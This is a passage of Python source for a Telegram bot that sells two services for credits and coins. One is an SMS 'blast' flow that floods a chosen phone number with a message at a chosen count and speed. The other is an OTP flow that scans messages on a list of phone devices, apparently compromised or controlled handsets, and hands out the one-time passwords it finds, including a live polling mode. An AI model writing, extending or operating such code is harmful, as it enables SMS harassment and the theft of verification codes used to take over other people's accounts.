        [btn("back", "user:home", EMOJI_GEAR, "🔙")],
    ])

# ============================================================
#  TICKET VIEW TEXT (both sides)
# ============================================================
def ticket_view_text(d, ticket_id, viewer="owner"):
    t = find_ticket(d, ticket_id)
    if not t:
        return "❌ Ticket not found."
    replies = d.get("ticket_replies", {}).get(ticket_id, [])
    status = t.get("status", "open")
    status_icon = "🟢" if status == "open" else "🔴"
    lines = [
        f"{em(EMOJI_BELL, '📩')} <b>Ticket {esc(ticket_id)}</b>\n",
        f"👤 User: <code>{t['uid']}</code> ({esc(str(t.get('name', '?'))[:40])})",
        f"🕐 Created: {fmt_time(t.get('ts', 0))}",
        f"📌 Status: {status_icon} {esc(status)}",
        "━━━━━━━━━━━━━━━━━━━━",
        f"<b>Original message:</b>",
        f"{esc(t.get('text', '')[:1000])}",
        "",
    ]
    if replies:
        lines.append("<b>Replies:</b>")
        for r in replies[-20:]:
            ts = fmt_time_short(r.get("ts", 0))
            fuid = r.get("from_uid", 0)
            role = "👑" if is_main_owner(fuid) or is_owner(fuid, d) else "🛡" if is_admin(fuid, d) else "👤"
            lines.append(f"{role} <code>{fuid}</code> [{ts}]")
            lines.append(f"   {esc(r.get('text', '')[:500])}")
    else:
        lines.append("<i>No replies yet.</i>")

    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    return txt

# ============================================================
#  GROUP PANEL TEXT
# ============================================================
def group_panel_text(d, chat_id, chat_title):
    gs = d.get("group_settings", {}).get(str(chat_id), {})
    muted = gs.get("stop", False)
    welcome = gs.get("welcome", True)
    users = d.get("users", {})
    chat_uid = str(chat_id)
    member_count = 0
    try:
        g = d.get("groups", {}).get(chat_uid, {})
        member_count = g.get("member_count", 0)
    except Exception:
        pass
    return (
        f"👥 <b>Group Panel</b>\n\n"
        f"📛 <b>{esc(chat_title)}</b>\n"
        f"🆔 <code>{chat_id}</code>\n\n"
        f"🤖 Bot status: <b>{'🔴 OFF (muted)' if muted else '🟢 ON'}</b>\n"
        f"👋 Welcome msg: <b>{'🟢 ON' if welcome else '🔴 OFF'}</b>\n"
        f"👥 Total users in DB: <b>{len(users)}</b>\n\n"
        f"<i>Commands: /stop /start /welcome on|off /mute /unmute /panel</i>"
    )

# ═══════════════════════════════════════════════════════════
#  END OF PART 5 — paste PART 6 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 6 — TERMS GATE + USER FLOWS
#  /start • send sms • OTP (NEW/OLD/live+refund) • wallet
#  redeem • daily bonus • transfer • gift • referral
#  leaderboard • coming soon
# ============================================================

# Router (shared)
R = Router()

# ============================================================
#  FORCE JOIN — CHECK MEMBER (FIXED for already-joined)
# ============================================================
async def _resolve_chat_candidate(raw):
    """Return candidate identifiers for get_chat_member."""
    raw = str(raw or "").strip()
    candidates = []
    if not raw:
        return candidates
    if raw.lstrip("-").isdigit():
        try:
            candidates.append(int(raw))
        except ValueError:
            pass
    if raw.startswith("@"):
        candidates.append(raw)
    elif "t.me/" in raw:
        m = re.search(r"t\.me/([A-Za-z0-9_]+)", raw)
        if m:
            candidates.append("@" + m.group(1))
    elif re.fullmatch(r"[A-Za-z0-9_]{5,}", raw):
        candidates.append("@" + raw)
    return candidates

async def check_member(bot, uid, ch_id):
    """
    Robust membership check.
    Returns True / False.
    Fixes the "already joined but bot says not joined" bug:
      - uses multiple candidate identifiers
      - handles restricted status with is_member flag
      - treats admin/creator as member
      - fails closed only on real errors, not timeouts
    """
    candidates = await _resolve_chat_candidate(ch_id)
    if not candidates:
        return False

    for candidate in candidates:
        try:
            member = await asyncio.wait_for(
                bot.get_chat_member(candidate, uid),
                timeout=_FJ_CHECK_TIMEOUT,
            )
        except asyncio.TimeoutError:
            # Network hiccup — do not treat as not-joined, retry next candidate.
            continue
        except Exception as exc:
            log.debug(f"[FJ-CHECK] get_chat_member failed chat={candidate}: {exc}")
            continue

        status = str(getattr(member, "status", "")).lower()
        if status in ("member", "administrator", "creator"):
            return True
        if status == "restricted":
            is_member = getattr(member, "is_member", None)
            if is_member is True:
                return True
            if is_member is False:
                return False
        if status in ("left", "kicked"):
            return False

    # All candidates failed — treat as not joined (fail-closed).
    return False

async def joined_all(bot, uid, d):
    if is_owner(uid, d):
        return True, []
    if uid in d.get("force_join", {}).get("bypass", []):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    channels = fj.get("channels", [])
    if not channels:
        return True, []

    tasks = [check_member(bot, uid, ch["id"]) for ch in channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    missing = []
    for ch, res in zip(channels, results):
        if isinstance(res, Exception) or not res:
            missing.append(ch)
    return len(missing) == 0, missing

def fj_text(missing):
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>Access locked — join required chats</b>\n",
        f"{em(EMOJI_BELL, '👇')} <b>Join every channel/group below, then tap Check Again:</b>",
    ]
    for ch in missing:
        t = esc(ch.get("title", "Channel"))
        lines.append(f"\n• <a href='{esc(ch['link'])}'>{t}</a>")
    lines.append(f"\n\n<i>After joining, tap /start</i>")
    return "\n".join(lines)

# ============================================================
#  FORCE JOIN CALLBACK — check again
# ============================================================
@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await joined_all(cq.bot, uid, d)
    if not joined:
        try:
            await cq.answer("❌ Not joined yet!")
        except Exception:
            pass
        await safe_edit(cq, fj_text(missing), fj_kb(missing))
        return
    try:
        await cq.answer("✅ Verified!")
    except Exception:
        pass
    await _render_home(cq, state, skip_fj=True)

# ============================================================
#  TERMS GATE — user-facing
# ============================================================
@R.callback_query(F.data == "terms:agree")
async def terms_agree(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if has_accepted_terms(uid, d):
        try:
            await cq.answer("✅ Already accepted")
        except Exception:
            pass
        await _render_home(cq, state, skip_fj=True)
        return

    accept_terms(uid, d)
    log_audit(d, "terms_accepted", uid, f"version={d.get('terms', {}).get('version', 1)}")
    save()

    _spawn(send_log(cq.bot, (
        f"✅ <b>TERMS ACCEPTED</b>\n\n"
        f"👤 {esc(cq.from_user.full_name or 'User')}\n"
        f"🆔 <code>{uid}</code>\n"
        f"🌐 @{esc(cq.from_user.username or 'None')}\n"
        f"📅 {fmt_time(now_ts())}\n"
        f"<i>User accepted terms and acknowledges full responsibility.</i>"
    )))

    try:
        await cq.answer("✅ Terms accepted!")
    except Exception:
        pass

    joined, missing = await joined_all(cq.bot, uid, d)
    if not joined:
        await safe_edit(cq, fj_text(missing), fj_kb(missing))
        return

    await _render_home(cq, state, skip_fj=True)

@R.callback_query(F.data == "terms:cancel")
async def terms_cancel(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer("❌ Cancelled", show_alert=True)
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_CROSS, '❌')} <b>Access denied</b>\n\n"
        f"You must accept the terms to use this bot.\n\n"
        f"<i>Send /start to try again.</i>",
        kb([(sc("start over"), "terms:agree")]) if False else None,
    )

# ============================================================
#  HOME RENDERER
# ============================================================
async def _render_home(cq: CallbackQuery, state: FSMContext, skip_fj=False):
    try:
        await state.clear()
    except Exception:
        pass
    uid = cq.from_user.id
    d = load()

    # banned
    if is_banned(uid, d):
        reason = d.get("ban_reasons", {}).get(str(uid), "")
        rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
        await safe_edit(
            cq,
            f"{em(EMOJI_CROSS, '🚫')} <b>Banned.</b>{rtxt}\n\n<i>Contact owner for appeal.</i>",
            kb([(sc("appeal"), "user:appeal")]),
        )
        return

    # terms gate (only for non-owner, non-admin)
    if not is_admin(uid, d) and not has_accepted_terms(uid, d):
        await safe_edit(
            cq,
            terms_text(d),
            terms_kb(),
            disable_preview=True,
        )
        return

    # force join
    if not skip_fj:
        joined, missing = await joined_all(cq.bot, uid, d)
        if not joined:
            await safe_edit(cq, fj_text(missing), fj_kb(missing))
            return

    # owner / admin panels
    if is_owner(uid, d):
        await safe_edit(cq, owner_panel_text(d), owner_kb(d))
        _OWNER_PANEL_STATE[uid] = {
            "chat_id": cq.message.chat.id,
            "msg_id": cq.message.message_id,
            "active": True,
            "last_user_action": time.time(),
        }
        return
    if is_admin(uid, d):
        await safe_edit(cq, admin_panel_text(d), admin_kb(d))
        return

    # global maintenance
    if d.get("settings", {}).get("maintenance"):
        msg = d.get("settings", {}).get("maintenance_msg", "🔧 Maintenance.")
        await safe_edit(cq, f"🔧 {esc(msg)}", kb([(sc("refresh"), "user:home")]))
        return

    await safe_edit(cq, user_home_text(uid, d), user_kb(d))

# ============================================================
#  /start COMMAND — with terms gate
# ============================================================
@R.message(CommandStart())
async def cmd_start(m: Message, state: FSMContext):
    await state.clear()
    uid = m.from_user.id
    d = load()
    is_new = reg_user(uid, m.from_user.full_name or "User", d)

    # referral
    args = (m.text or "").split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("SJ") and not d["users"].get(str(uid), {}).get("referred_by"):
        ok, msgref, referrer = process_referral(uid, code, d)
        if ok and referrer:
            try:
                await m.bot.send_message(referrer, f"🎉 <b>Referral!</b> {msgref}", parse_mode="HTML")
            except Exception:
                pass
    save()

    if is_new:
        _spawn(send_log(m.bot, (
            f"🆕 <b>NEW USER</b>\n\n"
            f"👤 {esc(m.from_user.full_name or 'User')}\n"
            f"🆔 <code>{uid}</code>\n"
            f"🌐 @{esc(m.from_user.username or 'None')}\n"
            f"📅 {fmt_time(now_ts())}"
        )))

    # banned first
    if is_banned(uid, d):
        reason = d.get("ban_reasons", {}).get(str(uid), "")
        rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
        await m.answer(f"🚫 <b>Banned.</b>{rtxt}", parse_mode="HTML")
        return

    # terms gate
    if not is_admin(uid, d) and not has_accepted_terms(uid, d):
        await m.answer(
            terms_text(d),
            reply_markup=terms_kb(),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return

    # force join
    joined, missing = await joined_all(m.bot, uid, d)
    if not joined:
        await m.answer(
            fj_text(missing),
            reply_markup=fj_kb(missing),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return

    if is_owner(uid, d):
        sent = await m.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        _OWNER_PANEL_STATE[uid] = {
            "chat_id": sent.chat.id,
            "msg_id": sent.message_id,
            "active": True,
            "last_user_action": time.time(),
        }
        return
    if is_admin(uid, d):
        await m.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if d.get("settings", {}).get("maintenance"):
        msg = d.get("settings", {}).get("maintenance_msg", "🔧 Maintenance.")
        await m.answer(f"🔧 {esc(msg)}", parse_mode="HTML")
        return
    await m.answer(user_home_text(uid, d), reply_markup=user_kb(d), parse_mode="HTML")

# ============================================================
#  HOME / CANCEL / REFRESH
# ============================================================
@R.callback_query(F.data.in_({
    "user:home", "user:cancel", "user:refresh",
    "owner:home", "owner:refresh",
    "admin:home", "admin:refresh",
}))
async def any_home(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await _render_home(cq, state, skip_fj=True)

# ============================================================
#  USER SEND FLOW
# ============================================================
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        try:
            await cq.answer("🚫 Banned!")
        except Exception:
            pass
        return

    # service maintenance
    allowed, reason = check_service(uid, d, "send_sms")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return

    # send limit
    if not is_admin(uid, d) and not is_owner(uid, d):
        ulim = get_user_send_limit(uid, d)
        if ulim is not None and ulim <= 0:
            try:
                await cq.answer("🚫 Send blocked!")
            except Exception:
                pass
            return

    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.send_number)
    await safe_edit(
        cq,
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Which number to SMS?\n<i>Example: +919876543210</i>",
        kb([(sc("cancel"), "user:home")]),
    )

@R.message(S.send_number)
async def user_got_number(m: Message, state: FSMContext):
    number = (m.text or "").strip()
    clean = number.replace("+", "").replace(" ", "").replace("-", "")
    if not clean.isdigit() or len(clean) < 7:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number.", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        d = load()
        puid = PROTECTED_NUMBERS[number]
        if not is_owner(m.from_user.id, d) and m.from_user.id != puid:
            await m.answer(f"{em(EMOJI_LOCK, '🔒')} Protected number!", parse_mode="HTML")
            return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{esc(mask_number(number))}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Enter message:",
        reply_markup=kb([(sc("cancel"), "user:cancel")]),
        parse_mode="HTML",
    )

@R.message(S.send_message)
async def user_got_message(m: Message, state: FSMContext):
    txt = (m.text or "").strip()
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    if len(txt) > 1000:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Too long (max 1000).", parse_mode="HTML")
        return
    await state.update_data(message=txt)
    await state.set_state(S.send_speed)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("user"),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_sel(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    d = load()
    uid = cq.from_user.id
    smap = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    sel = smap.get(cq.data, SPEED_FAST)
    label = "🚀 FAST" if sel == SPEED_FAST else "⚡ MEDIUM" if sel == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sel)
    await state.set_state(S.send_count)

    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(d)
        except Exception:
            devices = []
    real = len(devices)
    cnt = real * CURRENT_POWER_MODE if real > 0 else LAST_KNOWN_DEVICE_COUNT
    cinfo = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        uc = get_user_credits(uid, d)
        cinfo = f"\n💰 Credits: <b>{uc}</b>"
    await safe_edit(
        cq,
        f"{label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{cnt}</b>{cinfo}\n\n"
        f"How many SMS?",
        kb([(sc("cancel"), "user:cancel")]),
    )

@R.message(S.send_count)
async def user_got_count(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    fsmd = await state.get_data()
    try:
        cnt = int((m.text or "").strip())
        if cnt < 1:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send a number.", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    msg_text = fsmd.get("message", "")
    speed = fsmd.get("send_speed", SPEED_DEFAULT)

    is_regular = not is_admin(uid, d) and not is_owner(uid, d)

    if is_regular:
        cr = get_user_credits(uid, d)
        if cr <= 0:
            await m.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>No credits!</b>",
                reply_markup=kb([(sc("home"), "user:home")]),
                parse_mode="HTML",
            )
            return
        if cnt > cr:
            await m.answer(
                f"{em(EMOJI_WARNING, '⚠️')} Sirf <b>{cr}</b> credits hain. "
                f"Count <b>{cnt}</b> → <b>{cr}</b> kar diya.",
                parse_mode="HTML",
            )
            cnt = cr
        ulim = get_user_send_limit(uid, d)
        if ulim is not None:
            if ulim <= 0:
                await m.answer(
                    f"{em(EMOJI_CROSS, '🚫')} <b>Send blocked!</b>",
                    reply_markup=kb([(sc("home"), "user:home")]),
                    parse_mode="HTML",
                )
                return
            if cnt > ulim:
                await m.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} Daily limit <b>{ulim}</b>. "
                    f"Count adjusted.",
                    parse_mode="HTML",
                )
                cnt = ulim

    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(d)
        except Exception:
            devices = []
    if not devices:
        await m.answer(
            f"{em(EMOJI_WARNING, '😴')} No APIs online!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    await blast(m.bot, m, uid, number, msg_text, cnt, devices, speed)

# ============================================================
#  STOP BLAST
# ============================================================
@R.callback_query(F.data == "user:stop_send")
async def stop_blast(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(uid)
        if not s or (s.task and s.task.done()):
            try:
                await cq.answer("✅ No active blast!")
            except Exception:
                pass
            return
        s.cancelled = True
    try:
        await cq.answer("🛑 Stop signal sent!")
    except Exception:
        pass

# ============================================================
#  OTP MENU — device list
# ============================================================
def _otp_devices_kb(devices, page=0):
    per = 8
    tp = max(1, (len(devices) + per - 1) // per)
    page = max(0, min(page, tp - 1))
    start = page * per
    chunk = devices[start:start + per]
    rows = []
    for i, dv in enumerate(chunk):
        idx = start + i
        nm = str(dv.get("dev_name", "Device"))[:20]
        ph = dv.get("phone") or "no number"
        label = f"{nm} · {ph}"
        if len(label) > 42:
            label = label[:40] + ".."
        rows.append([btn(label, f"otp:dev:{idx}", EMOJI_PHONE, "📱")])
    nav = []
    if page > 0:
        nav.append(btn("prev", f"otp:pg:{page - 1}", EMOJI_GEAR, "◀️"))
    if page < tp - 1:
        nav.append(btn("next", f"otp:pg:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([
        btn("search device", "otp:search", EMOJI_SEARCH, "🔎"),
        btn("back", "user:home", EMOJI_GEAR, "🔙"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data == "user:otp:menu")
async def otp_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    if is_banned(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return

    # service maintenance
    allowed, reason = check_service(uid, d, "get_otp")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return

    # otp limit
    if not is_admin(uid, d) and not is_owner(uid, d):
        olim = get_user_otp_limit(uid, d)
        if olim is not None and olim <= 0:
            try:
                await cq.answer("🚫 OTP blocked!")
            except Exception:
                pass
            return
        if get_user_coins(uid, d) < 1:
            try:
                await cq.answer("🪙 No coins! OTP requires coins.", show_alert=True)
            except Exception:
                pass
            return

    try:
        await cq.answer()
    except Exception:
        pass

    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(d)
        except Exception:
            devices = []
    if not devices:
        await safe_edit(cq, f"😴 <b>No devices online</b>", kb([(sc("back"), "user:home")]))
        return

    devices_sorted = sorted_devices()
    cost = get_otp_cost(d)
    fresh_w = get_otp_fresh_window(d)
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>Get OTP</b>\n\n"
        f"Devices online: <b>{len(devices_sorted)}</b>\n"
        f"Cost: <b>{cost} 🪙</b> per successful fetch\n"
        f"Fresh window: <b>{fresh_w // 60} min</b>\n"
        f"<i>No coins deducted if no OTP found — refund auto.</i>\n\n"
        f"Select device:",
        _otp_devices_kb(devices_sorted, 0),
    )

@R.callback_query(F.data.regexp(r"^otp:pg:(\d+)$"))
async def otp_pg(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    p = int(cq.data.split(":")[-1])
    devices = sorted_devices()
    d = load()
    cost = get_otp_cost(d)
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>Get OTP</b>\n\n"
        f"Devices: <b>{len(devices)}</b> · Cost: <b>{cost} 🪙</b>\n\n"
        f"Select:",
        _otp_devices_kb(devices, p),
    )

@R.callback_query(F.data == "otp:search")
async def otp_search_start(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.device_search)
    await safe_edit(
        cq,
        f"{em(EMOJI_SEARCH, '🔎')} <b>Search Device</b>\n\n"
        f"Enter phone number or device name:",
        kb([(sc("cancel"), "user:otp:menu")]),
    )

@R.message(S.device_search)
async def otp_search_do(m: Message, state: FSMContext):
    q = (m.text or "").strip().lower()
    await state.clear()
    if not q:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    devices = sorted_devices()
    matches = []
    for i, dv in enumerate(devices):
        ph = str(dv.get("phone") or "")
        nm = str(dv.get("dev_name", ""))
        if q in ph.lower() or q in nm.lower():
            matches.append((i, dv))
    if not matches:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} No devices match.",
            reply_markup=kb([(sc("back"), "user:otp:menu")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_SEARCH, '🔎')} <b>Found {len(matches)}</b>\n"]
    rows = []
    for i, dv in matches[:15]:
        nm = esc(str(dv.get("dev_name", "Device"))[:20])
        ph = esc(str(dv.get("phone") or "no number"))
        lines.append(f"📱 {nm} — <code>{ph}</code>")
        rows.append([btn(f"{nm} · {ph}", f"otp:dev:{i}", EMOJI_PHONE, "📱")])
    rows.append([btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")])
    await m.answer("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

# ============================================================
#  OTP DEVICE SELECT
# ============================================================
@R.callback_query(F.data.regexp(r"^otp:dev:(\d+)$"))
async def otp_dev_select(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        await cq.answer()
    except Exception:
        pass
    idx = int(cq.data.split(":")[-1])
    dv = device_by_index(idx)
    if not dv:
        try:
            await cq.answer("❌ Device gone!", show_alert=True)
        except Exception:
            pass
        await otp_menu(cq, state)
        return
    ph = dv.get("phone") or "Unknown"
    nm = str(dv.get("dev_name", "Device"))[:30]
    fb = str(dv.get("fb_label", ""))[:25]
    cost = get_otp_cost(d)
    fresh_w = get_otp_fresh_window(d)
    rows = [
        [btn(f"🆕 check NEW ({cost} 🪙)", f"otp:fetch:new:{idx}", EMOJI_NEW, "🆕", style="success")],
        [btn(f"📜 check OLD (all)", f"otp:fetch:old:{idx}", EMOJI_CLOCK, "📜", style="primary")],
        [btn("⏱ live mode (5 min)", f"otp:live:{idx}", EMOJI_CLOCK, "⏱", style="success")],
        [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(
        cq,
        f"{em(EMOJI_PHONE, '📱')} <b>Device</b>\n\n"
        f"📛 Name: <b>{esc(nm)}</b>\n"
        f"📞 Number: <code>{esc(ph)}</code>\n"
        f"🔥 Firebase: {esc(fb)}\n"
        f"🪙 Cost: <b>{cost}</b> (refund if no OTP)\n"
        f"⏱ Fresh window: <b>{fresh_w // 60} min</b>\n\n"
        f"<b>🆕 NEW</b> — only fresh OTPs (within window)\n"
        f"<b>📜 OLD</b> — all available OTPs\n"
        f"<b>⏱ LIVE</b> — auto-poll for {_OTP_LIVE_TIMEOUT // 60} min",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

# ============================================================
#  OTP — FETCH NEW / OLD
# ============================================================
@R.callback_query(F.data.regexp(r"^otp:fetch:(new|old):(\d+)$"))
async def otp_fetch_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    parts = cq.data.split(":")
    mode = parts[2]  # new | old
    idx = int(parts[3])

    dv = device_by_index(idx)
    if not dv:
        try:
            await cq.answer("❌ Device gone!", show_alert=True)
        except Exception:
            pass
        await otp_menu(cq, state)
        return

    # service check
    allowed, reason = check_service(uid, d, "get_otp")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return

    cost = get_otp_cost(d)
    is_priv = is_admin(uid, d) or is_owner(uid, d)

    if not is_priv:
        olim = get_user_otp_limit(uid, d)
        if olim is not None and olim <= 0:
            try:
                await cq.answer("🚫 Blocked!")
            except Exception:
                pass
            return
        if get_user_coins(uid, d) < cost:
            try:
                await cq.answer(f"🪙 Need {cost} coins!", show_alert=True)
            except Exception:
                pass
            return

    try:
        await cq.answer("🔍 Scanning...")
    except Exception:
        pass
    await safe_edit(cq, f"{em(EMOJI_OTP, '🔍')} <b>Scanning messages...</b>\n<i>Please wait ~5s</i>")

    fresh_secs = get_otp_fresh_window(d)
    all_msgs = await collect_all_messages(dv, limit=_OTP_MAX_SCAN)
    fresh_cutoff = now_ts() - fresh_secs

    if mode == "new":
        otps = [m for m in all_msgs if m["has_otp"] and m["ts"] >= fresh_cutoff]
    else:
        otps = [m for m in all_msgs if m["has_otp"]]

    # refund logic — no OTP found, no deduction
    if not is_priv:
        if not otps:
            d.setdefault("stats", {})["otp_refunds"] = d.get("stats", {}).get("otp_refunds", 0) + 1
            save()
        else:
            if deduct_coins(uid, cost, d, "otp"):
                k = str(uid)
                d["users"][k]["otp_uses"] = d["users"][k].get("otp_uses", 0) + 1
                d["stats"]["otp_fetches"] = d.get("stats", {}).get("otp_fetches", 0) + 1
            else:
                try:
                    await cq.answer("🪙 Insufficient coins!", show_alert=True)
                except Exception:
                    pass
                return
    else:
        if otps:
            d["stats"]["otp_fetches"] = d.get("stats", {}).get("otp_fetches", 0) + 1

    # record history
    if otps:
        first = otps[0]
        record_otp_history(
            d, uid,
            otp=first["otps"][0] if first["otps"] else "?",
            sender=first["sender"],
            device=dv,
            cost_paid=0 if is_priv else cost,
        )
    save()

    mode_lbl = "🆕 NEW" if mode == "new" else "📜 OLD"
    if not otps:
        txt = (
            f"{em(EMOJI_CROSS, '❌')} <b>No OTP found ({mode_lbl})</b>\n\n"
            f"📱 Device: <code>{esc(dv.get('phone') or 'no number')}</code>\n"
            f"📊 Scanned: <b>{len(all_msgs)}</b>\n"
        )
        if not is_priv:
            txt += f"\n💰 <b>Coins refunded</b> — no charge for empty result."
        if mode == "new":
            txt += f"\n<i>No fresh OTP in last {fresh_secs // 60} min. Try 'OLD'.</i>"
        else:
            txt += f"\n<i>No OTP in any message. Try live mode.</i>"
    else:
        txt = format_otp_list(otps, f"OTPs Found ({len(otps)})", mode_lbl, limit=15)

    rows = [
        [btn("🆕 NEW", f"otp:fetch:new:{idx}", EMOJI_NEW, "🆕", style="success"),
         btn("📜 OLD", f"otp:fetch:old:{idx}", EMOJI_CLOCK, "📜", style="primary")],
        [btn("⏱ live mode", f"otp:live:{idx}", EMOJI_CLOCK, "⏱", style="success")],
        [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
    ]
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

# ============================================================
#  OTP — LIVE MODE (new-only, refund if none)
# ============================================================
@R.callback_query(F.data.regexp(r"^otp:live:(\d+)$"))
async def otp_live_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    idx = int(cq.data.split(":")[-1])
    dv = device_by_index(idx)
    if not dv:
        try:
            await cq.answer("❌ Gone!", show_alert=True)
        except Exception:
            pass
        await otp_menu(cq, state)
        return

    # service check
    allowed, reason = check_service(uid, d, "get_otp")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return

    cost = get_otp_cost(d)
    is_priv = is_admin(uid, d) or is_owner(uid, d)
    if not is_priv:
        if get_user_coins(uid, d) < cost:
            try:
                await cq.answer(f"🪙 Need {cost} coins!", show_alert=True)
            except Exception:
                pass
            return

    try:
        await cq.answer("⏱ Live mode ON!")
    except Exception:
        pass

    old = OTP_LIVE_SESSIONS.get(uid)
    if old and old.get("task") and not old["task"].done():
        try:
            old["task"].cancel()
        except Exception:
            pass

    started = now_ts()
    sess = {
        "device": dv,
        "chat_id": cq.message.chat.id,
        "msg_id": cq.message.message_id,
        "started": started,
        "seen_hashes": set(),
        "cost": 0 if is_priv else cost,
        "is_priv": is_priv,
        "last_otp_ts": 0,
        "task": None,
        "coins_spent": 0,
    }
    OTP_LIVE_SESSIONS[uid] = sess

    # initial scan — since now (new-only)
    init_txt = (
        f"⏱ <b>Live OTP Mode ON</b>\n\n"
        f"📞 <code>{esc(dv.get('phone') or 'no number')}</code>\n"
        f"📛 {esc(str(dv.get('dev_name', ''))[:30])}\n\n"
        f"🔍 <i>Initial scan (new only)…</i>"
    )
    await safe_edit(
        cq, init_txt,
        InlineKeyboardMarkup(inline_keyboard=[
            [btn("stop live", "otp:live_stop", EMOJI_CROSS, "🛑", style="danger")],
            [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
        ]),
    )

    async def live_loop():
        # initial scan
        initial_found = []
        try:
            initial_msgs = await collect_all_messages(dv, limit=_OTP_MAX_SCAN)
            for m in initial_msgs:
                sess["seen_hashes"].add(m["hash"])
            # take fresh OTPs (last 60s) only for initial
            cutoff = started - 60
            initial_found = [m for m in initial_msgs if m["has_otp"] and m["ts"] >= cutoff]
        except Exception as e:
            log.debug(f"[OTP LIVE] init scan failed: {e}")

        # deduct for initial found
        if initial_found:
            if not is_priv:
                for m in initial_found:
